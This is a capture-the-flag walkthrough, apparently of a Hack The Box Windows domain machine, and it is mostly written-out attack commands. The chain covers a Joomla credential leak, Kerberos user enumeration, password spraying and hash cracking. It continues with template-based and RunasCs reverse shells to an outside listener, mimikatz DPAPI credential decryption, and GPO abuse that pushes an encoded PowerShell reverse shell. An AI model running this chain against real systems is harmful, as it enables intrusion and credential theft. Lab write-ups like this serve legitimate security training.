Check port 80, login in form, default creds dont work.

Directory enum
feroxbuster -u http://10.10.11.3 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php

nuclei -target http://10.10.11.3
nikto -h http://10.10.11.3

From directory enum we find joomla cms

from nuclei we find CVE-2023-23752 adn accessing the endpoints that it provides we I’ve successfully obtained the username and password for the database. Let’s try using this password to log in to the page.

It looks like the password didn’t work. Let’s try an AS-REP attack and utilize the Kerbrute tool to enumerate usernames.

./kerbrute userenum --dc 10.10.11.3 -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

we get a list of usernames.
Use crackmapexec with the password we found.

crackmapexec smb 10.10.11.3 -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --shares

The enumerated user “dwolfe” can log in to SMB and directly access it using SMBClient.

smbclient -U 'dwolfe' //10.10.11.3/'SOC Analysis'
There’s a pcap file inside. Download it and open it with Wireshark to take a look.

Scroll down, and you’ll notice that packets of the krb5 protocol have been sniffed, revealing the Kerberos protocol request. You can observe the hash type in the cipher. For more information, you can refer to this article: https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/

As per the article’s description, the hash type is krb5. In the header, “krb5” represents the hash type, “18” indicates the length of the hash. “tstark” is the username, visible in the data packet. “OFFICE.HTB” is the address at the end

$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc

hashcat -m 19900 hash.txt /usr/share/wordlists/rockyou.txt

I cracked the password, and it is “playboy69.”

Tried to log in with tstark but did not work, tried with administrator and we are in the cms.
I changed the template of atum, specifically the error.php and accessed it at http://10.10.11.3/administrator/templates/atum/error.php

Got reverse shell as web_account

This shell cannot be used to get the user flag, but since we have `tstark` credentials, we can just move laterally to this user with `runascs`

I upload RunasCs.exe and run
.\RunasCs.exe tstark <password> cmd.exe -r 10.10.15.46:9999

 rlwrap -cAr nc -lvp 9999

i used this as when tried to use runas with a r1.exe from msfvenom i did not have permissions to run it. I dont know why.

We check with netsta -ano and we find an port 8083
We port forward with chisel

there is an internal site in which we can upload resumes. after an failed resume we find the types which we can upload where one is odt.

Using this https://github.com/elweth-sec/CVE-2023-2255
we create a test.exe and upload it at the public user folder. then we upload the resume succesfully, open a listener and wait for connection from user Ppotts.

Another way is to serach inside the c:\xampp\htdocs\ with the web_account user, tstart does not have permissions, and read the source code of resume php. Then we can uppload the .odt file at c:\xampp\htdocs\internal\applications where the applications go.

Enumerate stored credentials

cmdkey /list
"""
Currently stored credentials:

    Target: LegacyGeneric:target=MyTarget
    Type: Generic 
    User: MyUser
    
    Target: Domain:interactive=OFFICE\hhogan
    Type: Domain Password
    User: OFFICE\hhogan
"""
It seems credential for user hhogan is stored in the vault, however we are not able to use it with runas since it is protected by DPAPI.

We look for windows credential files in the file system.
dir /a %appdata%\Microsoft\Credentials

And the masterkey files
dir /a %appdata%\microsoft\protect
dir /a c:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107 (The SID we find at the directory above)

transfer a copy of mimikatz to the host and enumerate the credentials files.
dpapi::cred /in:%appdata%\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4

We see this file uses the masterkey GUID {191d3f9d-7959-4b4d-a520-a444853c47eb}, so we decrypt this mastery key with mimikatz.
dpapi::masterkey /in:c:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc

Now that we have the key, we can decrpt the credentials file and get hhogan password.
dpapi::cred /in:%appdata%\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166

Connect with evil-winrm
evil-winrm -u hhogan -p <password here> -i dc.office.htb

Get-ADDomain
net user hhogan

paying attention to the groups memberships the user is a member of the GPO managers which suggest he may be able to write GPOs.

Enumerate all the domain GPOs.

Get-GPO -All
Notice the Default Domain Controllers Policy GPO and take note of its Id: 6AC1786C-016F-11D2-945F-00C04fB984F9

Upload powerview and continue enumerating GPO Managers group
Get-NetGroup -name *GPO*
Take note of the ojectsid: S-1-5-21-1199398058-4196589450-691661856-1117 and move forward. Next step is to enumerate all the permissions for all GPO in the current domain with PowerView.

Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
The ouput is very large but, if you analyze it carefully, you'll see group GPO Managers (S-1-5-21-1199398058-4196589450-691661856-1117) have write permissions on the Default Domain Controllers Policy (6AC1786C-016F-11D2-945F-00C04fB984F9).

To exploit this misconfiguration we will use a tool called SharpGPOAbuse (https://github.com/byronkg/SharpGPOAbuse), so we can modify the GPO and execute any command as administrator. A list of the tool capabilities is available here: https://github.com/FSecureLABS/SharpGPOAbuse.
In this case, we will abuse the GPO to send a base-64 encoded reverse shell under the administrator context.

.\SharpGPOAbuse.exe --AddComputerTask --TaskName "New Task" --Author OFFICE\Administrator --Command "cmd.exe" --Arguments "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOA[...]" --GPOName "Default Domain Controllers Policy"
The task is added as a new immediate tasks, to force execution just update the GPO policy
gpupdate /force
nc -lvnp 5555

we get root
